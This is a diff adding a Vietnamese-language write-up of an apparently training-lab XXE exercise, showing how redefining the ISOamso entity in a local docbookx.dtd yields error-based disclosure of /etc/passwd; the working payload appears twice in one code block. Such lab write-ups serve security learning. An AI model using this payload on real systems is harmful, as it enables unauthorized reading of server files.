@@ -116,4 +116,43 @@ Trong request `POST /post/comment`, ta upload file svg với nội dung như sau
 Sau khi submit, vào link hình ảnh đã upload, ta thu được nội dung file /etc/hostname là "0478d36e6700". Submit solution, kết quả thành công.
 
 # 9. Exploiting XXE to retrieve data by repurposing a local DTD
+Cấu hình code xml trong request `POST /product/stock`
+
+Thử chèn đoạn DTD
+```
+<!DOCTYPE foo [
+<!ENTITY % docbookx SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%docbookx;
+]>
+```
+thì thấy không có lỗi. Như vậy file `docbookx.dtd` có tồn tại. Trong `docbookx.dtd` có chứa một parameter entity là `ISOamso`, như vậy ta sẽ thử định nghĩa lại entity này.
+
+Sử dụng đoạn DTD sau làm payload:
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]><!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+Đoạn code trên được thực thi như sau:
+1) Khai báo parameter entity là `local_dtd` chứa nội dung file `docbookx.dtd`
+2) Định nghĩa parameter entity `ISOamso` chứa đoạn code dùng để exploit error-based XXE.
+3) `%local_dtd;` sẽ gọi đến `%ISOamso;` với tư cách là một external entity. Như vậy đoạn code trong `ISOamso` parameter entity ta định nghĩa ở trên sẽ được chạy. Phần còn lại tương tự những gì sẽ xảy ra đối với error-based XML trong bài 6.
+
+![image](https://user-images.githubusercontent.com/103978452/208043930-6ef05ad2-3856-4ee8-a8f5-4e949701b2b5.png)
 
